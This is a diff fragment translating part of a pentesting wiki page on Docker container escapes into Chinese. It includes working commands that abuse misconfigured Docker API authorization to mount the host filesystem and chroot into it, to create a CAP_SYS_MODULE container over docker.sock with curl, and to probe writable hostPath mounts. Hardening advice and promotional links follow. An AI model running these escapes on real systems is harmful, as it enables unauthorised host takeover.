+当系统管理员配置docker防火墙时，可能会**忘记一些重要的API参数**（[https://docs.docker.com/engine/api/v1.40/#operation/ContainerList](https://docs.docker.com/engine/api/v1.40/#operation/ContainerList)），比如“**Binds**”。\
+在下面的示例中，可以利用这个配置错误创建和运行一个容器，该容器挂载了主机的根（/）文件夹：
 ```bash
 docker version #First, find the API version of docker, 1.40 in this example
 docker images #List the images available
@@ -484,11 +481,9 @@ docker start f6932bc153ad #Start the created privileged container
 docker exec -it f6932bc153ad chroot /host bash #Get a shell inside of it
 #You can access the host filesystem
 ```
+## 未检查的JSON属性
 
-## Unchecked JSON Attribute
-
-It's possible that when the sysadmin configured the docker firewall he **forgot about some important attribute of a parametter** of the API ([https://docs.docker.com/engine/api/v1.40/#operation/ContainerList](https://docs.docker.com/engine/api/v1.40/#operation/ContainerList)) like "**Capabilities**" inside "**HostConfig**". In the following example it's possible to abuse this misconfiguration to create and run a container with the **SYS_MODULE** capability:
-
+有可能当系统管理员配置Docker防火墙时，**忘记了API的某个参数的一些重要属性**（[https://docs.docker.com/engine/api/v1.40/#operation/ContainerList](https://docs.docker.com/engine/api/v1.40/#operation/ContainerList)），比如在“**HostConfig**”中的“**Capabilities**”。在下面的示例中，可以利用这个配置错误来创建和运行一个具有**SYS_MODULE**能力的容器：
 ```bash
 docker version
 curl --unix-socket /var/run/docker.sock -H "Content-Type: application/json" -d '{"Image": "ubuntu", "HostConfig":{"Capabilities":["CAP_SYS_MODULE"]}}' http:/v1.40/containers/create
@@ -498,11 +493,9 @@ docker exec -it c52a77629a91 bash
 capsh --print
 #You can abuse the SYS_MODULE capability
 ```
+# 可写的 hostPath 挂载
 
-# Writable hostPath Mount
-
-(Info from [**here**](https://medium.com/swlh/kubernetes-attack-path-part-2-post-initial-access-1e27aabda36d)) Within the container, an attacker may attempt to gain further access to the underlying host OS via a writable hostPath volume created by the cluster. Below is some common things you can check within the container to see if you leverage this attacker vector:
-
+（来自[**这里**](https://medium.com/swlh/kubernetes-attack-path-part-2-post-initial-access-1e27aabda36d)的信息）在容器内部，攻击者可以尝试通过集群创建的可写 hostPath 卷来进一步访问底层主机操作系统。以下是您可以在容器内部检查的一些常见事项，以查看是否可以利用此攻击向量：
 ```bash
 ### Check if You Can Write to a File-system
 $ echo 1 > /proc/sysrq-trigger
@@ -516,28 +509,27 @@ $ mount /dev/sda1 /mnt-testmount: /mnt: permission denied. ---> Failed! but if n
 ### debugfs (Interactive File System Debugger)
 $ debugfs /dev/sda1
 ```
+# 容器安全改进
 
-# Containers Security Improvements
+## Docker中的Seccomp
 
-## Seccomp in Docker
-
-This is not a technique to breakout from a Docker container but a security feature that Docker uses and you should know about as it might prevent you from breaking out from docker:
+这不是一个从Docker容器中突破的技术，而是Docker使用的一种安全功能，你应该了解它，因为它可能会阻止你从Docker中突破出来：
 
 {% content-ref url="seccomp.md" %}
 [seccomp.md](seccomp.md)
 {% endcontent-ref %}
 
-## AppArmor in Docker
+## Docker中的AppArmor
 
-This is not a technique to breakout from a Docker container but a security feature that Docker uses and you should know about as it might prevent you from breaking out from docker:
+这不是一个从Docker容器中突破的技术，而是Docker使用的一种安全功能，你应该了解它，因为它可能会阻止你从Docker中突破出来：
 
 {% content-ref url="apparmor.md" %}
 [apparmor.md](apparmor.md)
 {% endcontent-ref %}
 
-## AuthZ & AuthN
+## 认证和授权
 
-An authorization plugin **approves** or **denies** **requests** to the Docker **daemon** based on both the current **authentication** context and the **command** **context**. The **authentication** **context** contains all **user details** and the **authentication** **method**. The **command context** contains all the **relevant** **request** data.
+授权插件根据当前的身份验证上下文和命令上下文来**批准**或**拒绝**对Docker守护程序的请求。身份验证上下文包含所有用户详细信息和身份验证方法。命令上下文包含所有相关的请求数据。
 
 {% content-ref url="broken-reference" %}
 [Broken link](broken-reference)
@@ -545,32 +537,32 @@ An authorization plugin **approves** or **denies** **requests** to the Docker **
 
 ## gVisor
 
-**gVisor** is an application kernel, written in Go, that implements a substantial portion of the Linux system surface. It includes an [Open Container Initiative (OCI)](https://www.opencontainers.org) runtime called `runsc` that provides an **isolation boundary between the application and the host kernel**. The `runsc` runtime integrates with Docker and Kubernetes, making it simple to run sandboxed containers.
+**gVisor**是一个用Go语言编写的应用内核，它实现了Linux系统的大部分功能。它包括一个名为`runsc`的[Open Container Initiative (OCI)](https://www.opencontainers.org)运行时，提供了应用程序和主机内核之间的**隔离边界**。`runsc`运行时与Docker和Kubernetes集成，使得运行沙盒容器变得简单。
 
 {% embed url="https://github.com/google/gvisor" %}
 
 # Kata Containers
 
-**Kata Containers** is an open source community working to build a secure container runtime with lightweight virtual machines that feel and perform like containers, but provide** stronger workload isolation using hardware virtualization** technology as a second layer of defense.
+**Kata Containers**是一个开源社区，致力于构建一个安全的容器运行时，使用轻量级虚拟机，感觉和性能与容器相似，但通过硬件虚拟化技术提供了更强大的工作负载隔离作为第二层防御。
 
 {% embed url="https://katacontainers.io/" %}
 
-## Use containers securely
+## 安全使用容器
 
-Docker restricts and limits containers by default. Loosening these restrictions may create security issues, even without the full power of the `--privileged` flag. It is important to acknowledge the impact of each additional permission, and limit permissions overall to the minimum necessary.
+Docker默认限制和限制容器。放宽这些限制可能会导致安全问题，即使没有使用`--privileged`标志的全部权限。重要的是要认识到每个额外权限的影响，并将权限总体限制在最低限度。
 
-To help keep containers secure:
+为了保持容器的安全性：
 
-* Do not use the `--privileged` flag or mount a [Docker socket inside the container](https://raesene.github.io/blog/2016/03/06/The-Dangers-Of-Docker.sock/). The docker socket allows for spawning containers, so it is an easy way to take full control of the host, for example, by running another container with the `--privileged` flag.
-* Do not run as root inside the container. Use a [different user](https://docs.docker.com/develop/develop-images/dockerfile_best-practices/#user) or [user namespaces](https://docs.docker.com/engine/security/userns-remap/). The root in the container is the same as on host unless remapped with user namespaces. It is only lightly restricted by, primarily, Linux namespaces, capabilities, and cgroups.
-* [Drop all capabilities](https://docs.docker.com/engine/reference/run/#runtime-privilege-and-linux-capabilities) (`--cap-drop=all`) and enable only those that are required (`--cap-add=...`). Many of workloads don’t need any capabilities and adding them increases the scope of a potential attack.
-* [Use the “no-new-privileges” security option](https://raesene.github.io/blog/2019/06/01/docker-capabilities-and-no-new-privs/) to prevent processes from gaining more privileges, for example through suid binaries.
-* [Limit resources available to the container](https://docs.docker.com/engine/reference/run/#runtime-constraints-on-resources). Resource limits can protect the machine from denial of service attacks.
-* Adjust [seccomp](https://docs.docker.com/engine/security/seccomp/), [AppArmor](https://docs.docker.com/engine/security/apparmor/) (or SELinux) profiles to restrict the actions and syscalls available for the container to the minimum required.
-* Use [official docker images](https://docs.docker.com/docker-hub/official_images/) or build your own based on them. Don’t inherit or use [backdoored](https://arstechnica.com/information-technology/2018/06/backdoored-images-downloaded-5-million-times-finally-removed-from-docker-hub/) images.
-* Regularly rebuild your images to apply security patches. This goes without saying.
+* 不要使用`--privileged`标志或在容器内挂载[Docker套接字](https://raesene.github.io/blog/2016/03/06/The-Dangers-Of-Docker.sock/)。Docker套接字允许生成容器，因此通过使用`--privileged`标志运行另一个容器是控制主机的简单方法。
+* 不要在容器内以root身份运行。使用[不同的用户](https://docs.docker.com/develop/develop-images/dockerfile_best-practices/#user)或[用户命名空间](https://docs.docker.com/engine/security/userns-remap/)。容器中的root与主机上的root相同，除非使用用户命名空间重新映射。它仅受到Linux命名空间、能力和cgroups的轻微限制。
+* [丢弃所有能力](https://docs.docker.com/engine/reference/run/#runtime-privilege-and-linux-capabilities)(`--cap-drop=all`)，仅启用所需的能力(`--cap-add=...`)。许多工作负载不需要任何能力，添加能力会增加潜在攻击的范围。
+* [使用“no-new-privileges”安全选项](https://raesene.github.io/blog/2019/06/01/docker-capabilities-and-no-new-privs/)防止进程通过suid二进制文件获得更多权限。
+* [限制容器可用的资源](https://docs.docker.com/engine/reference/run/#runtime-constraints-on-resources)。资源限制可以保护机器免受拒绝服务攻击。
+* 调整[seccomp](https://docs.docker.com/engine/security/seccomp/)、[AppArmor](https://docs.docker.com/engine/security/apparmor/)（或SELinux）配置文件，将容器可用的操作和系统调用限制为最低限度。
+* 使用[官方的Docker镜像](https://docs.docker.com/docker-hub/official_images/)或基于它们构建自己的镜像。不要继承或使用[后门](https://arstechnica.com/information-technology/2018/06/backdoored-images-downloaded-5-million-times-finally-removed-from-docker-hub/)镜像。
+* 定期重建镜像以应用安全补丁。这是不言而喻的。
 
-# References
+# 参考资料
 
 * [https://blog.trailofbits.com/2019/07/19/understanding-docker-container-escapes/](https://blog.trailofbits.com/2019/07/19/understanding-docker-container-escapes/)
 * [https://twitter.com/\_fel1x/status/1151487051986087936](https://twitter.com/\_fel1x/status/1151487051986087936)
@@ -581,16 +573,14 @@ To help keep containers secure:
 
 <summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>
 
-- Do you work in a **cybersecurity company**? Do you want to see your **company advertised in HackTricks**? or do you want to have access to the **latest version of the PEASS or download HackTricks in PDF**? Check the [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!
+- 你在一家**网络安全公司**工作吗？你想在HackTricks中看到你的**公司广告**吗？或者你想获得最新版本的PEASS或下载PDF格式的HackTricks吗？查看[**订阅计划**](https://github.com/sponsors/carlospolop)！
 
-- Discover [**The PEASS Family**](https://opensea.io/collection/the-peass-family), our collection of exclusive [**NFTs**](https://opensea.io/collection/the-peass-family)
+- 发现我们的独家[NFTs](https://opensea.io/collection/the-peass-family)收藏品**The PEASS Family**。
 
-- Get the [**official PEASS & HackTricks swag**](https://peass.creator-spring.com)
+- 获得[**官方PEASS和HackTricks周边产品**](https://peass.creator-spring.com)。
 
-- **Join the** [**💬**](https://emojipedia.org/speech-balloon/) [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** me on **Twitter** [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
+- **加入**[**💬**](https://emojipedia.org/speech-balloon/) [**Discord群组**](https://discord.gg/hRep4RUj7f)或[**电报群组**](https://t.me/peass)，或在**Twitter**上**关注**我[**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks_live)**。**
 
-- **Share your hacking tricks by submitting PRs to the [hacktricks repo](https://github.com/carlospolop/hacktricks) and [hacktricks-cloud repo](https://github.com/carlospolop/hacktricks-cloud)**.
+- **通过向[hacktricks repo](https://github.com/carlospolop/hacktricks)和[hacktricks-cloud repo](https://github.com/carlospolop/hacktricks-cloud)提交PR来分享你的黑客技巧**。
 
 </details>
-
-
